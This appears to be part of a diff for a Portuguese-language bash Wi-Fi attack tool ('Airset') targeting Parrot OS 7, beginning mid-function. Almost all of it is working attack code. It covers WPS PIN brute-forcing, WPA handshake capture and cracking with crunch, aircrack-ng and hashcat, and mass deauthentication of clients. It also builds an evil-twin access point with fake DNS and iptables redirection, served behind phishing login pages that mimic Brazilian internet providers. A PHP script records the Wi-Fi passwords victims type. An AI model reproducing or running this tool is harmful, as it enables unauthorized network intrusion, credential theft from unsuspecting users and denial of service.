+                           [[ "$DETECT" == *"limiting"* ]] && mdk3 "$WIFI_MONITOR1" x 0 -t "$mac" -n "$ssid" -s 250 &
+                           sleep 1
+                       done; menu ;;
+                    7) bully -b "$mac" -c "$channel" "$WIFI_MONITOR1"; menu ;;
+                    8|9) bully -b "$mac" -c "$channel" "$WIFI_MONITOR1" | tee BullyOutput.txt &
+                       bully_pid=$!
+                       while kill -0 $bully_pid 2>/dev/null; do
+                           DETECT=$(awk '/./{line=$0}END{print line}' BullyOutput.txt)
+                           [[ "$DETECT" == *"lockout"* ]] && mdk3 "$WIFI_MONITOR1" a -a "$mac" -m &
+                           sleep 1
+                       done; menu ;;
+                    10) exitmode ;;
+                    *) echo "Opção inválida"; menu ;;
+                esac
+            }
+            menu
+        ;;
+        # Casos 2-5 seguem o mesmo padrão, simplificados para manutenção
+        2|3|4|5)
+            echo "Multi-adaptador: configure WIFI_MONITOR1..${a} manualmente e relance o módulo WPS."
+            sleep 3; askAP
+        ;;
+    esac
+}
+
+################################### < BRUTEFORCE > ###################################
+function Bruteforce() {
+    clear; top
+    echo; echo "*** Método de Ataque ***"
+    echo "1) Crunch       - Senhas sequenciais"
+    echo "2) RandomGen    - Senhas aleatórias"
+    echo "3) Dicionário   - Wordlist"
+    echo "4) Telefone     - Números de telefone"
+    echo "5) Hashcat      - Máscara (requer .hccapx)"
+    echo -n "#> "
+    read -r a
+
+    case $a in
+        1|2|3|4)
+            echo "Onde está o arquivo .cap? (ex: /root/handshakes/)"
+            read -r CAPLOCATION
+            cd "$CAPLOCATION" || return
+            ls
+            echo "Nome do arquivo .cap:"
+            read -r CAPNAME
+            ;;
+    esac
+
+    case $a in
+        1)
+            echo "BSSID da rede:"; read -r BSSID
+            echo "Tamanho mínimo:"; read -r MIN
+            echo "Tamanho máximo:"; read -r MAX
+            echo "Charset (ex: 0123456789):"; read -r CHARSET
+            crunch "$MIN" "$MAX" "$CHARSET" | aircrack-ng --bssid "$BSSID" -w- "${CAPLOCATION}${CAPNAME}"
+            ;;
+        2)
+            echo "BSSID:"; read -r BSSID
+            echo "Tamanho:"; read -r MAX
+            echo "Charset:"; read -r CHARSET
+            cat /dev/urandom | tr -dc "$CHARSET" | fold -w "$MAX" | aircrack-ng --bssid "$BSSID" -w- "${CAPLOCATION}${CAPNAME}"
+            ;;
+        3)
+            echo "Local do dicionário:"; read -r DICTLOCATION
+            echo "Nome do dicionário:"; read -r DICTNAME
+            aircrack-ng "${CAPLOCATION}${CAPNAME}" -w "${DICTLOCATION}${DICTNAME}"
+            ;;
+        4)
+            echo "BSSID:"; read -r BSSID
+            echo "DDD/Código de área:"; read -r AREACODE
+            echo "[1](555)555-5555 [2]555-555-5555 [3]5555555555 [4]555-5555 [5]5555555"
+            read -r fmt
+            case $fmt in
+                1) crunch 13 13 -t "\\($AREACODE\\)%%%\\-%%%%"  | aircrack-ng --bssid "$BSSID" -w- "${CAPLOCATION}${CAPNAME}" ;;
+                2) crunch 12 12 -t "$AREACODE\\-%%%\\-%%%%"      | aircrack-ng --bssid "$BSSID" -w- "${CAPLOCATION}${CAPNAME}" ;;
+                3) crunch 10 10 -t "${AREACODE}%%%%%%%"          | aircrack-ng --bssid "$BSSID" -w- "${CAPLOCATION}${CAPNAME}" ;;
+                4) crunch  8  8 -t "%%%\\-%%%%"                  | aircrack-ng --bssid "$BSSID" -w- "${CAPLOCATION}${CAPNAME}" ;;
+                5) crunch  7  7 -t "%%%%%%%"                     | aircrack-ng --bssid "$BSSID" -w- "${CAPLOCATION}${CAPNAME}" ;;
+            esac
+            ;;
+        5)
+            # Parrot OS 7: hccapx (hashcat ≥ 6 usa .hc22000 via hcxtools)
+            echo "Arquivo .cap:"; read -r CAPNAME; read -r CAPLOCATION
+            echo "Convertendo para .hc22000 (requer hcxtools)..."
+            if command -v hcxpcapngtool &>/dev/null; then
+                hcxpcapngtool -o "${CAPLOCATION}${CAPNAME}.hc22000" "${CAPLOCATION}${CAPNAME}"
+                echo "Máscara (ex: ?d?d?d?d?d?d?d?d):"; read -r MASK
+                hashcat -m 22000 -a 3 "${CAPLOCATION}${CAPNAME}.hc22000" "$MASK"
+            else
+                echo "hcxtools não encontrado. Instale: apt install hcxtools"
+            fi
+            ;;
+    esac
+}
+
+function Bruteforce2() {
+    BSSID="$Host_MAC"
+    CAPNAME="$Host_SSID-$Host_MAC.cap"
+    Bruteforce
+}
+
+################################### < HANDSHAKE > ###################################
+function handshakelocation() {
+    conditional_clear; top; infoap
+
+    local saved_hs="/root/handshakes/${Host_SSID2}-${Host_MAC}.cap"
+    if [ -f "$saved_hs" ]; then
+        echo -e "Handshake encontrado: ${yellow}${saved_hs}${transparent}"
+        echo -e "${red}Deseja usá-lo? [s/n]${transparent}"
+        read -r usehandshakefile
+        [ "$usehandshakefile" = "s" ] || [ -z "$usehandshakefile" ] && handshakeloc="$saved_hs"
+    fi
+
+    if [ -z "$handshakeloc" ]; then
+        echo; echo -e "Caminho do handshake (Enter para capturar agora):"
+        echo -n "Path: "; echo -ne "$red"
+        read -r handshakeloc; echo -ne "$transparent"
+    fi
+
+    if [ -z "$handshakeloc" ]; then
+        deauthforce
+    else
+        if [ -f "$handshakeloc" ]; then
+            Host_SSID_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d "(" -f2 | cut -d "'" -f2)
+            Host_MAC_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')
+            if [[ "$Host_MAC_loc" == *"$Host_MAC"* ]] && [[ "$Host_SSID_loc" == *"$Host_SSID"* ]]; then
+                if aircrack-ng "$handshakeloc" | grep -q "1 handshake"; then
+                    cp "$handshakeloc" "$DUMP_PATH/$Host_MAC-01.cap"
+                    webinterface
+                else
+                    echo -e "${yellow}Handshake corrompido.${transparent}"
+                    echo "Tentar com pyrit? [s/Enter=não]"; read -r resp
+                    if [ -n "$resp" ]; then
+                        if pyrit -r "$handshakeloc" analyze 2>&1 | grep -qi "good,"; then
+                            cp "$handshakeloc" "$DUMP_PATH/$Host_MAC-01.cap"; webinterface
+                        else echo "Corrompido."; sleep 2; handshakelocation; fi
+                    else handshakelocation; fi
+                fi
+            else
+                echo -e "${red}MAC/SSID não correspondem.${transparent}"; sleep 4; handshakelocation
+            fi
+        else
+            echo "Arquivo não encontrado."; sleep 2; handshakelocation
+        fi
+    fi
+}
+
+function deauthforce() {
+    conditional_clear; top
+    while true; do
+        echo -e "${red}[${yellow}i${red}]${transparent} $header_deauthforce"
+        echo -e "      ${red}[${yellow}1${red}]${transparent} $deauthforce_option_1"
+        echo -e "      ${red}[${yellow}2${red}]${transparent} pyrit"
+        echo -e "      ${red}[${yellow}3${red}]${transparent} $general_back"
+        echo -n -e "${red}[${white}w4r10ck${white}@${white}airset${red}]-[${white}~${red}]${transparent}"
+        read -r yn
+        case $yn in
+            1) handshakemode="normal"; askclientsel; break ;;
+            2) handshakemode="hard"; askclientsel; break ;;
+            3) askauth; break ;;
+            *) echo "$general_case_error"; conditional_clear ;;
+        esac
+    done
+}
+
+function askclientsel() {
+    conditional_clear
+    while true; do
+        top
+        echo -e "${red}[${yellow}i${red}]${transparent} $header_deauthMENU"
+        echo -e "      ${red}[${yellow}1${red}]${transparent} Deauth all"
+        echo -e "      ${red}[${yellow}2${red}]${transparent} Deauth all [mdk3]"
+        echo -e "      ${red}[${yellow}3${red}]${transparent} Deauth alvo específico"
+        echo -e "      ${red}[${yellow}4${red}]${transparent} Rescanear redes"
+        echo -e "      ${red}[${yellow}5${red}]${transparent} Sair"
+        echo -n -e "${red}[${white}w4r10ck${white}@${white}airset${red}]-[${white}~${red}]${transparent}"
+        read -r yn
+        case $yn in
+            1) deauth all; break ;;
+            2) deauth mdk3; break ;;
+            3) deauth esp; break ;;
+            4) killall airodump-ng &>"$flux_output_device"; deltax; break ;;
+            5) exitmode; break ;;
+            *) echo "$general_case_error"; conditional_clear ;;
+        esac
+    done
+}
+
+function deauth() {
+    conditional_clear
+    iwconfig "$WIFI_MONITOR" channel "$Host_CHAN"
+
+    case $1 in
+        all)
+            DEAUTH=deauthall
+            capture & $DEAUTH
+            CSVDB=$Host_MAC-01.csv
+            ;;
+        mdk3)
+            DEAUTH=deauthmdk3
+            capture & $DEAUTH &
+            CSVDB=$Host_MAC-01.csv
+            ;;
+        esp)
+            DEAUTH=deauthesp
+            HOST=$(grep -a "$Host_MAC" "$DUMP_PATH/$CSVDB" | awk '{print $1}' | grep -av '00:00:00:00' | grep -v "$Host_MAC" || true)
+            LINEAS_CLIENTES=$(echo "$HOST" | wc -m)
+            if [ "$LINEAS_CLIENTES" -le 5 ]; then
+                DEAUTH=deauthall
+                capture & $DEAUTH
+                CSVDB=$Host_MAC-01.csv
+            fi
+            capture
+            for CLIENT in $HOST; do
+                Client_MAC=${CLIENT:0:17}
+                deauthesp
+            done
+            $DEAUTH
+            CSVDB=$Host_MAC-01.csv
+            ;;
+    esac
+
+    deauthMENU
+}
+
+function deauthMENU() {
+    while true; do
+        conditional_clear; clear; top
+        echo -e "${red}[${yellow}i${red}]${transparent} $header_deauthMENU"
+        echo; echo -e "Status handshake: $Handshake_statuscheck"; echo
+        echo -e "      ${red}[${yellow}1${red}]${transparent} $deauthMENU_option_1"
+        echo -e "      ${red}[${yellow}2${red}]${transparent} $general_back"
+        echo -e "      ${red}[${yellow}3${red}]${transparent} Selecionar outra rede"
+        echo -e "      ${red}[${yellow}4${red}]${transparent} Sair"
+        echo -n '      #> '
+        read -r yn
+        case $yn in
+            1) checkhandshake ;;
+            2) conditional_clear; killall xterm &>"$flux_output_device"; askclientsel; break ;;
+            3) killall airodump-ng mdk3 aireplay-ng xterm &>"$flux_output_device"; CSVDB=dump-01.csv; killall xterm &>"$flux_output_device"; selection; break ;;
+            4) exitmode; break ;;
+            *) echo "$general_case_error"; conditional_clear ;;
+        esac
+    done
+}
+
+function capture() {
+    conditional_clear
+    if ! pgrep -x airodump-ng &>/dev/null; then
+        rm -rf "${DUMP_PATH:?}/$Host_MAC"*
+        xterm $HOLD -title "Capturando canal $Host_CHAN" $TOPRIGHT \
+            -bg "#000000" -fg "#FFFFFF" \
+            -e airodump-ng --ignore-negative-one --bssid "$Host_MAC" \
+               -w "$DUMP_PATH/$Host_MAC" -c "$Host_CHAN" -a "$WIFI_MONITOR" &
+    fi
+}
+
+function checkhandshake() {
+    if [ "$handshakemode" = "normal" ]; then
+        if aircrack-ng "$DUMP_PATH/$Host_MAC-01.cap" | grep -q "1 handshake"; then
+            killall airodump-ng mdk3 aireplay-ng &>"$flux_output_device"
+            wpaclean "$HANDSHAKE_PATH/${Host_SSID2}-${Host_MAC}.cap" "$DUMP_PATH/$Host_MAC-01.cap" &>"$flux_output_device"
+            webinterface
+        else
+            Handshake_statuscheck="${red}Não Encontrado${transparent}"
+        fi
+    elif [ "$handshakemode" = "hard" ]; then
+        pyrit -r "$DUMP_PATH/$Host_MAC-01.cap" -o "$DUMP_PATH/test.cap" stripLive &>"$flux_output_device"
+        if pyrit -r "$DUMP_PATH/test.cap" analyze 2>&1 | grep -q "good,"; then
+            killall airodump-ng mdk3 aireplay-ng &>"$flux_output_device"
+            pyrit -r "$DUMP_PATH/test.cap" -o "$HANDSHAKE_PATH/${Host_SSID2}-${Host_MAC}.cap" strip &>"$flux_output_device"
+            webinterface
+        else
+            if aircrack-ng "$DUMP_PATH/$Host_MAC-01.cap" | grep -q "1 handshake"; then
+                Handshake_statuscheck="${yellow}Corrompido${transparent}"
+            else
+                Handshake_statuscheck="${red}Não Encontrado${transparent}"
+            fi
+        fi
+        rm -f "$DUMP_PATH/test.cap" &>"$flux_output_device"
+    fi
+}
+
+################################### < SSL > ###################################
+function certssl() {
+    if [ -f /root/server.pem ] && [ -s /root/server.pem ]; then
+        webinterface
+    else
+        while true; do
+            conditional_clear; top
+            echo -e "${red}[${yellow}i${red}]${transparent} Certificado SSL inválido ou ausente"
+            echo -e "      ${red}[${yellow}1${red}]${transparent} Criar certificado SSL"
+            echo -e "      ${red}[${yellow}2${red}]${transparent} Verificar novamente"
+            echo -e "      ${red}[${yellow}3${red}]${red} Sair${transparent}"
+            echo -n '      #> '
+            read -r yn
+            case $yn in
+                1) creassl ;;
+                2) certssl; break ;;
+                3) exitmode; break ;;
+                *) echo "$general_case_error"; conditional_clear ;;
+            esac
+        done
+    fi
+}
+
+function creassl() {
+    xterm -title "Criar Certificado SSL" \
+        -e openssl req -subj '/CN=SEGURO/O=SEGURA/OU=SEGURA/C=BR' \
+           -new -newkey rsa:2048 -days 365 -nodes -x509 \
+           -keyout /root/server.pem -out /root/server.pem
+    certssl
+}
+
+################################### < INTERFACE WEB / ATAQUE > ###################################
+function webinterface() {
+    chmod 400 /root/server.pem 2>/dev/null || true
+    while true; do
+        conditional_clear; top; infoap
+        echo; echo -e "${red}[${yellow}i${red}]${transparent} $header_webinterface"; echo
+        echo -e "      ${red}[${yellow}1${red}]${transparent} Web Interface (Login Falso)"
+        echo -e "      ${red}[${yellow}2${red}]${transparent} Bruteforce"
+        echo -e "      ${red}[${yellow}3${red}]${transparent} \e[1;31mSair${transparent}"
+        echo -n -e "${red}[${white}w4r10ck${white}@${white}airset${red}]-[${white}~${red}]${transparent}"
+        read -r yn
+        case $yn in
+            1) matartodo; ConnectionRESET; selection; break ;;
+            2) matartodo; Bruteforce2; break ;;
+            3) matartodo; exitmode; break ;;
+        esac
+    done
+}
+
+function ConnectionRESET() {
+    while true; do
+        conditional_clear; top; infoap; n=1
+        echo; echo -e "${red}[${yellow}i${red}]${transparent} $header_ConnectionRESET"; echo
+        echo -e "      Provedores:"; echo
+        echo -e "      ${red}[${white}1${red}]${transparent} Airset Default (Atualização de Firmware)"; n=$((n+1))
+        echo -e "      ${red}[${white}2${red}]${transparent} OI VELOX"; n=$((n+1))
+        echo -e "      ${red}[${white}3${red}]${transparent} NET VIRTUA"; n=$((n+1))
+        echo; echo -e "      Fabricantes:"; echo
+        echo -e "      ${red}[${white}4${red}]${transparent} D-Link (Em Breve)"; n=$((n+1))
+        echo -e "      ${red}[${white}5${red}]${transparent} TP-Link (Em Breve)"; n=$((n+1))
+        echo -e "      ${red}[${white}0${red}]${transparent}\e[1;31m $general_back${transparent}"
+        echo
+        echo -n -e "${red}[${white}w4r10ck${white}@${white}airset${red}]-[${white}~${red}]${transparent}"
+        read -r fluxass
+
+        case "$fluxass" in
+            1) INTERFACE_NEUTRA; break ;;
+            2) INTERFACE_VELOX; break ;;
+            3) INTERFACE_VIRTUA; break ;;
+            4|5|6|7|8) INTERFACE_NEUTRA; break ;;
+            0) conditional_clear; webinterface; break ;;
+        esac
+    done
+    preattack
+    attack
+}
+
+function preattack() {
+    # Configuração do hostapd
+    cat > "$DUMP_PATH/hostapd.conf" <<EOF
+interface=$WIFI
+driver=nl80211
+ssid=$Host_SSID
+channel=$Host_CHAN
+EOF
+
+    mkdir -p "$DUMP_PATH/data"
+
+    # PHP de verificação de senha — Python 3 no fakedns
+    cat > "$DUMP_PATH/data/check.php" <<'PHPEOF'
+<?php
+error_reporting(0);
+$count_file = "/tmp/TMPairset/hit.txt";
+$hits = file($count_file);
+$hits[0]++;
+$fp = fopen($count_file, "w");
+fputs($fp, $hits[0]);
+fclose($fp);
+
+$key1 = @$_POST['key1'];
+$filename  = "/tmp/TMPairset/data.txt";
+$attemptlog = "/tmp/TMPairset/pwattempt.txt";
+$intento   = "/tmp/TMPairset/intento";
+
+$pwlog = fopen($attemptlog, "w");
+fwrite($pwlog, $key1 . "\n");
+fclose($pwlog);
+
+$file = fopen($filename, "w");
+fwrite($file, $key1 . "\n");
+fclose($file);
+
+$archivo = fopen($intento, "w");
+fwrite($archivo, "\n");
+fclose($archivo);
+
+$limit = time() + 30;
+while (time() < $limit) {
+    if (!file_exists($intento)) { header("Location:error.html"); break; }
+    $val = trim(file_get_contents($intento));
+    if ($val === "1") { header("Location:error.html"); unlink($intento); break; }
+    if ($val === "2") { header("Location:success.html"); break; }
+    sleep(1);
+}
+?>
+PHPEOF
+
+    # Configuração DHCP
+    cat > "$DUMP_PATH/dhcpd.conf" <<EOF
+authoritative;
+default-lease-time 600;
+max-lease-time 7200;
+subnet ${RANG_IP}.0 netmask 255.255.255.0 {
+option broadcast-address ${RANG_IP}.255;
+option routers $IP;
+option subnet-mask 255.255.255.0;
+option domain-name-servers $IP;
+range ${RANG_IP}.100 ${RANG_IP}.250;
+}
+EOF
+    touch "$DUMP_PATH/dhcpd.leases"
+
+    # Configuração lighttpd com caminho php-cgi dinâmico
+    cat > "$DUMP_PATH/lighttpd.conf" <<EOF
+server.document-root = "$DUMP_PATH/data/"
+server.modules = (
+  "mod_access", "mod_alias", "mod_accesslog",
+  "mod_fastcgi", "mod_redirect", "mod_rewrite"
+)
+fastcgi.server = ( ".php" => ((
+  "bin-path" => "$PHP_CGI",
+  "socket"   => "/tmp/php.socket"
+)))
+server.port     = 80
+server.pid-file = "/var/run/lighttpd.pid"
+mimetype.assign = (
+  ".html" => "text/html", ".htm" => "text/html",
+  ".txt"  => "text/plain", ".jpg" => "image/jpeg",
+  ".png"  => "image/png",  ".css" => "text/css"
+)
+server.error-handler-404           = "/"
+static-file.exclude-extensions     = ( ".php", ".rb", "~" )
+index-file.names                   = ( "index.htm","index.html","index.php" )
+\$HTTP["host"] =~ "^www\\.(.*)$" {
+  url.redirect = ( "^/(.*)" => "http://%1/\$1" )
+}
+EOF
+
+    # fakedns em Python 3 (Python 2 foi removido do Parrot OS 7)
+    cat > "$DUMP_PATH/fakedns" <<PYEOF
+#!/usr/bin/env python3
+import socket, struct
+
+class DNSQuery:
+    def __init__(self, data):
+        self.data = data
+        self.domain = ''
+        tipo = (data[2] >> 3) & 15
+        if tipo == 0:
+            ini = 12
+            lon = data[ini]
+            while lon != 0:
+                self.domain += data[ini+1:ini+lon+1].decode() + '.'
+                ini += lon + 1
+                lon = data[ini]
+
+    def resposta(self, ip):
+        packet = b''
+        if self.domain:
+            packet  = self.data[:2] + b'\x81\x80'
+            packet += self.data[4:6] + self.data[4:6] + b'\x00\x00\x00\x00'
+            packet += self.data[12:]
+            packet += b'\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
+            packet += bytes(int(x) for x in ip.split('.'))
+        return packet
+
+if __name__ == '__main__':
+    ip = '$IP'
+    print(f'pyminifakeDNS :: dom.query. 60 IN A {ip}')
+    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    udps.bind(('', 53))
+    try:
+        while True:
+            data, addr = udps.recvfrom(1024)
+            p = DNSQuery(data)
+            udps.sendto(p.resposta(ip), addr)
+            print(f'Requisição: {p.domain} -> {ip}')
+    except KeyboardInterrupt:
+        print('Encerrando fakedns')
+        udps.close()
+PYEOF
+    chmod +x "$DUMP_PATH/fakedns"
+}
+
+# Configura roteamento com 'ip' (ifconfig obsoleto no Parrot OS 7)
+function routear() {
+    ip link set "$interfaceroutear" up
+    ip addr flush dev "$interfaceroutear" 2>/dev/null || true
+    ip addr add "${IP}/24" dev "$interfaceroutear"
+    ip route add "${RANG_IP}.0/24" via "$IP" dev "$interfaceroutear" 2>/dev/null || true
+
+    sysctl -w net.ipv4.ip_forward=1 &>"$flux_output_device"
+
+    iptables --flush
+    iptables --table nat --flush
+    iptables --delete-chain
+    iptables --table nat --delete-chain
+    iptables -P FORWARD ACCEPT
+    iptables -t nat -A PREROUTING -p tcp --dport 80  -j DNAT --to-destination "$IP:80"
+    iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination "$IP:80"
+    iptables -t nat -A POSTROUTING -j MASQUERADE
+}
+
+function attack() {
+    [ "$fakeapmode" = "hostapd" ]    && interfaceroutear="$WIFI"
+    [ "$fakeapmode" = "airbase-ng" ] && interfaceroutear="at0"
+
+    handshakecheck
+    nomac=$(tr -dc 'A-F0-9' < /dev/urandom | fold -w2 | head -n100 | grep -v "${mac:13:1}" | head -c1)
+
+    if [ "$fakeapmode" = "hostapd" ]; then
+        ip link set "$WIFI" down; sleep 0.4
+        macchanger --mac="${mac::13}${nomac}${mac:14:4}" "$WIFI" &>"$flux_output_device"; sleep 0.4
+        ip link set "$WIFI" up; sleep 0.4
+        killall hostapd &>"$flux_output_device"
+        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e hostapd "$DUMP_PATH/hostapd.conf" &
+    elif [ "$fakeapmode" = "airbase-ng" ]; then
+        killall airbase-ng &>"$flux_output_device"
+        xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" \
+            -e airbase-ng -P -e "$Host_SSID" -c "$Host_CHAN" \
+               -a "${mac::13}${nomac}${mac:14:4}" "$WIFI_MONITOR" &
+    fi
+    sleep 5
+
+    routear &
+    sleep 3
+
+    killall dhcpd &>"$flux_output_device"
+    fuser -n tcp -k 53 67 80 &>"$flux_output_device"
+    fuser -n udp -k 53 67 80 &>"$flux_output_device"
+
+    xterm -bg black -fg green $TOPLEFT -T DHCP \
+        -e "dhcpd -d -f -lf \"$DUMP_PATH/dhcpd.leases\" -cf \"$DUMP_PATH/dhcpd.conf\" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
+
+    xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" \
+        -e "python3 $DUMP_PATH/fakedns" &
+
+    lighttpd -f "$DUMP_PATH/lighttpd.conf" &>"$flux_output_device"
+
+    killall aireplay-ng mdk3 &>"$flux_output_device"
+    echo "$Host_MAC" > "$DUMP_PATH/mdk3.txt"
+    xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
+        -title "Deauth [mdk3] $Host_SSID" \
+        -e mdk3 "$WIFI_MONITOR" d -b "$DUMP_PATH/mdk3.txt" -c "$Host_CHAN" &
+
+    xterm -hold $TOPRIGHT -title "Informação do Alvo" -e "$DUMP_PATH/handcheck" &
+    conditional_clear
+
+    while true; do
+        top
+        echo -e "${red}[${yellow}i${red}]${transparent} Ataque em execução..."
+        echo "      1) Selecionar outro alvo"
+        echo "      2) Sair"
+        echo -n '      #> '
+        read -r yn
+        case $yn in
+            1) matartodo; CSVDB=dump-01.csv; selection; break ;;
+            2) matartodo; exitmode; break ;;
+            *) echo "$general_case_error"; conditional_clear ;;
+        esac
+    done
+}
+
+function handshakecheck() {
+    cat > "$DUMP_PATH/handcheck" <<SHEOF
+#!/bin/bash
+echo > $DUMP_PATH/data.txt
+echo -n "0" > $DUMP_PATH/hit.txt
+echo "" > $DUMP_PATH/loggg
+tput civis; clear
+i=0
+timestamp=\$(date +%s)
+
+while true; do
+  seg=\$i
+  dias=\$(( seg / 86400 ))
+  seg=\$(( seg % 86400 ))
+  horas=\$(( seg / 3600 ))
+  seg=\$(( seg % 3600 ))
+  minutos=\$(( seg / 60 ))
+  seg=\$(( seg % 60 ))
+
+  [ "\$seg"     -le 9 ] && is="0" || is=""
+  [ "\$minutos" -le 9 ] && im="0" || im=""
+  [ "\$horas"   -le 9 ] && ih="0" || ih=""
+
+SHEOF
+
+    if [ "$authmode" = "handshake" ]; then
+        cat >> "$DUMP_PATH/handcheck" <<SHEOF2
+  if [ -f $DUMP_PATH/pwattempt.txt ]; then
+    cat $DUMP_PATH/pwattempt.txt >> "$PASSLOG_PATH/$Host_SSID-$Host_MAC.log"
+    rm -f $DUMP_PATH/pwattempt.txt
+  fi
+  if [ -f $DUMP_PATH/intento ]; then
+    if ! aircrack-ng -w $DUMP_PATH/data.txt $DUMP_PATH/$Host_MAC-01.cap | grep -qi "Passphrase not in"; then
+      echo "2" > $DUMP_PATH/intento; break
+    else
+      echo "1" > $DUMP_PATH/intento
+    fi
+  fi
+SHEOF2
+    elif [ "$authmode" = "wpa_supplicant" ]; then
+        cat >> "$DUMP_PATH/handcheck" <<SHEOF3
+  if [ -f $DUMP_PATH/pwattempt.txt ]; then
+    cat $DUMP_PATH/pwattempt.txt >> "$PASSLOG_PATH/$Host_SSID-$Host_MAC.log"
+    rm -f $DUMP_PATH/pwattempt.txt
+  fi
+  wpa_passphrase $Host_SSID \$(cat $DUMP_PATH/data.txt) > $DUMP_PATH/wpa_supplicant.conf &
+  wpa_supplicant -i$WIFI -c$DUMP_PATH/wpa_supplicant.conf -f $DUMP_PATH/loggg &
+  if [ -f $DUMP_PATH/intento ]; then
+    if grep -i 'WPA: Key negotiation completed' $DUMP_PATH/loggg; then
+      echo "2" > $DUMP_PATH/intento; break
+    else
+      echo "1" > $DUMP_PATH/intento
+    fi
+  fi
+SHEOF3
+    fi
+
+    cat >> "$DUMP_PATH/handcheck" <<SHEOF4
+  readarray -t CLIENTESDHCP < <(nmap -PR -sn -n -oG - ${RANG_IP}.100-110 2>&1 | grep Host)
+  echo
+  echo -e "  ROTEADOR ALVO:"
+  echo -e "    SSID.........: \e[1;37m$Host_SSID\e[0m"
+  echo -e "    MAC..........: \e[1;33m$Host_MAC\e[0m"
+  echo -e "    CANAL........: \e[1;37m$Host_CHAN\e[0m"
+  echo -e "    TEMPO........: \e[1;34m\${ih}\${horas}:\${im}\${minutos}:\${is}\${seg}\e[0m"
+  echo -e "    TENTATIVAS...: \e[1;31m\$(cat $DUMP_PATH/hit.txt)\e[0m"
+  echo -e "    CLIENTES.....: \e[1;34m\$(cat $DUMP_PATH/clientes.txt 2>/dev/null | grep DHCPACK | awk '{print \$5}' | sort | uniq | wc -l)\e[0m"
+  echo
+  let i=\$(date +%s)-\$timestamp
+  sleep 1
+done
+
+clear
+echo "1" > $DUMP_PATH/status.txt
+sleep 5
+
+killall mdk3 aireplay-ng airbase-ng hostapd lighttpd dhcpd wpa_supplicant &>/dev/null
+pkill -f fakedns &>/dev/null
+
+SENHA=\$(cat $DUMP_PATH/data.txt)
+cat > "$HOME/$Host_SSID-password.txt" <<INFO
+Airset ${version} | Parrot OS 7
+
+NOME:     $Host_SSID
+BSSID:    $Host_MAC ($Host_MAC_MODEL)
+CANAL:    $Host_CHAN
+SEGURANÇA:$Host_ENC
+SENHA:    \$SENHA
+INFO
+
+echo -e "Senha salva em \e[1;31m$HOME/$Host_SSID-password.txt\e[0m"
+SHEOF4
+
+    chmod +x "$DUMP_PATH/handcheck"
+}
+
+################################### < DEAUTH > ###################################
+function deauthall() {
+    xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
+        -title "Deauth all em $Host_SSID" \
+        -e aireplay-ng --deauth "$DEAUTHTIME" -a "$Host_MAC" --ignore-negative-one "$WIFI_MONITOR" &
+}
+
+function deauthmdk3() {
+    echo "$Host_MAC" > "$DUMP_PATH/mdk3.txt"
+    xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
+        -title "Deauth mdk3 em $Host_SSID" \
+        -e mdk3 "$WIFI_MONITOR" d -b "$DUMP_PATH/mdk3.txt" -c "$Host_CHAN" &
+}
+
+function deauthesp() {
+    sleep 2
+    xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
+        -title "Deauth $Client_MAC" \
+        -e aireplay-ng -0 "$DEAUTHTIME" -a "$Host_MAC" -c "$Client_MAC" --ignore-negative-one "$WIFI_MONITOR" &
+}
+
+function matartodo() {
+    killall aireplay-ng hostapd lighttpd dhcpd xterm &>"$flux_output_device"
+    pkill -f fakedns &>"$flux_output_device"
+}
+
+################################### < INTERFACES WEB > ###################################
+function INTERFACE_NEUTRA() {
+    mkdir -p "$DUMP_PATH/data"
+    for f in NotoSans-Regular.ttf error.html success.html index.htm; do
+        [ -f "$WORK_DIR/web_interfaces/neutra/$f" ] && cp "$WORK_DIR/web_interfaces/neutra/$f" "$DUMP_PATH/data/"
+    done
+}
+
+function INTERFACE_VELOX() {
+    mkdir -p "$DUMP_PATH/data"
+    for d in fonts images; do
+        [ -d "$WORK_DIR/web_interfaces/velox/$d" ] && cp -r "$WORK_DIR/web_interfaces/velox/$d" "$DUMP_PATH/data/"
+    done
+    for f in error.html autenticar.html favicon.ico success.html index.htm; do
+        [ -f "$WORK_DIR/web_interfaces/velox/$f" ] && cp "$WORK_DIR/web_interfaces/velox/$f" "$DUMP_PATH/data/"
+    done
+}
+
+function INTERFACE_VIRTUA() {
+    mkdir -p "$DUMP_PATH/data"
+    for d in img js styles; do
+        [ -d "$WORK_DIR/web_interfaces/virtua/$d" ] && cp -r "$WORK_DIR/web_interfaces/virtua/$d" "$DUMP_PATH/data/"
+    done
+    for f in error.html success.html index.htm; do
+        [ -f "$WORK_DIR/web_interfaces/virtua/$f" ] && cp "$WORK_DIR/web_interfaces/virtua/$f" "$DUMP_PATH/data/"
+    done
+}
+
+################################### < INÍCIO > ###################################
+top && setresolution && setinterface
